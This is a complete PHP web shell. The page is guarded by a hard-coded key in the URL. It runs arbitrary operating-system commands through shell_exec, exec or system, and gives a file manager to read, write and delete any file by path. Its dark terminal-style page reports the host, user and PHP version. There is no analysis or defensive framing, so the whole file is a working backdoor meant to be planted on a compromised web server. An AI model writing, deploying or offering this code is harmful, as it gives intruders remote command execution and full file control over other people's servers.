<?php
@error_reporting(0);
$key = 'ayam';
if (($_GET['k'] ?? $_GET['key'] ?? '') !== $key) { http_response_code(403); exit; }

$cwd = isset($_POST['cwd']) && is_dir($_POST['cwd']) ? $_POST['cwd'] : getcwd();
$out = '';

if (isset($_POST['cmd']) && $_POST['cmd'] !== '') {
    $cmd = $_POST['cmd'];
    if (function_exists('shell_exec')) {
        $out = shell_exec('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1', $lines);
        $out = implode("\n", $lines);
    } elseif (function_exists('system')) {
        ob_start();
        system('cd ' . escapeshellarg($cwd) . ' && ' . $cmd . ' 2>&1');
        $out = ob_get_clean();
    } else {
        $out = 'No execution function available';
    }
    if ($out === null) $out = '';
}

if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $path   = $_POST['path'] ?? '';

    if ($action === 'read' && $path) {
        $out = @file_get_contents($path);
        if ($out === false) $out = 'Cannot read: ' . $path;
    }
    if ($action === 'write' && $path) {
        $content = $_POST['content'] ?? '';
        $ok = @file_put_contents($path, $content);
        $out = $ok !== false ? 'Written ' . $ok . ' bytes' : 'Write failed: ' . $path;
    }
    if ($action === 'delete' && $path) {
        $out = @unlink($path) ? 'Deleted' : 'Delete failed';
    }
}

$host    = php_uname('n');
$user    = function_exists('get_current_user') ? get_current_user() : '?';
$phpver  = PHP_VERSION;
$self    = $_SERVER['PHP_SELF'];
$keyval  = htmlspecialchars($_GET['k'] ?? $_GET['key'] ?? $key);
?><!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>sh</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#0d0d0d;color:#e0e0e0;font:13px/1.5 monospace;padding:12px}
.bar{background:#1a1a1a;border:1px solid #333;padding:6px 10px;margin-bottom:8px;display:flex;gap:10px;align-items:center;flex-wrap:wrap}
.bar span{color:#888;font-size:11px}
.bar b{color:#4fc3f7}
input,textarea{background:#111;border:1px solid #333;color:#e0e0e0;font:13px monospace;padding:5px 8px;outline:none}
input:focus,textarea:focus{border-color:#555}
.cmd-row{display:flex;gap:6px;margin-bottom:8px}
.cmd-row input{flex:1}
button{background:#1e1e1e;border:1px solid #444;color:#ccc;padding:5px 12px;cursor:pointer;font:13px monospace}
button:hover{background:#2a2a2a;border-color:#666}
.out{background:#111;border:1px solid #2a2a2a;padding:8px;white-space:pre-wrap;word-break:break-all;max-height:400px;overflow-y:auto;margin-bottom:8px;font-size:12px}
.tabs{display:flex;gap:4px;margin-bottom:8px}
.tab{padding:4px 12px;cursor:pointer;border:1px solid #333;background:#1a1a1a;color:#888}
.tab.active{background:#222;color:#e0e0e0;border-bottom-color:#222}
.sec{display:none}.sec.active{display:block}
.row{display:flex;gap:6px;margin-bottom:6px;align-items:center}
.row label{color:#888;font-size:11px;width:60px;flex-shrink:0}
.row input{flex:1}
textarea.big{width:100%;height:220px;resize:vertical}
.info{color:#888;font-size:11px;margin-bottom:8px}
</style>
</head>
<body>
<div class="bar">
  <span>host: <b><?php echo htmlspecialchars($host); ?></b></span>
  <span>user: <b><?php echo htmlspecialchars($user); ?></b></span>
  <span>php: <b><?php echo $phpver; ?></b></span>
  <span>cwd: <b><?php echo htmlspecialchars($cwd); ?></b></span>
</div>

<div class="tabs">
  <div class="tab active" onclick="sw('shell',this)">Shell</div>
  <div class="tab" onclick="sw('files',this)">Files</div>
</div>

<div id="shell" class="sec active">
  <form method="post">
    <input type="hidden" name="cwd" id="cwd_field" value="<?php echo htmlspecialchars($cwd); ?>">
    <div class="cmd-row">
      <input type="text" name="cmd" id="cmd" placeholder="command..." autofocus autocomplete="off">
      <button type="submit">Run</button>
    </div>
    <?php if ($out !== '' && isset($_POST['cmd'])): ?>
    <div class="out"><?php echo htmlspecialchars($out); ?></div>
    <?php endif; ?>
  </form>
</div>

<div id="files" class="sec">
  <form method="post">
    <p class="info">Read / Write / Delete files by absolute path</p>
    <div class="row"><label>Path</label><input type="text" name="path" value="<?php echo htmlspecialchars($_POST['path'] ?? ''); ?>" placeholder="/var/www/..."></div>
    <div class="row">
      <label>Action</label>
      <select name="action" style="background:#111;border:1px solid #333;color:#e0e0e0;padding:5px;font:13px monospace">
        <option value="read">Read</option>
        <option value="write">Write</option>
        <option value="delete">Delete</option>
      </select>
      <button type="submit">Go</button>
    </div>
    <?php if ($out !== '' && isset($_POST['action'])): ?>
    <div class="out"><?php echo htmlspecialchars($out); ?></div>
    <?php endif; ?>
    <textarea class="big" name="content" placeholder="file content (for write)"><?php echo htmlspecialchars($_POST['content'] ?? ''); ?></textarea>
  </form>
</div>

<script>
function sw(id,el){
  document.querySelectorAll('.sec').forEach(function(s){s.classList.remove('active')});
  document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active')});
  document.getElementById(id).classList.add('active');
  el.classList.add('active');
}
</script>
</body>
</html>
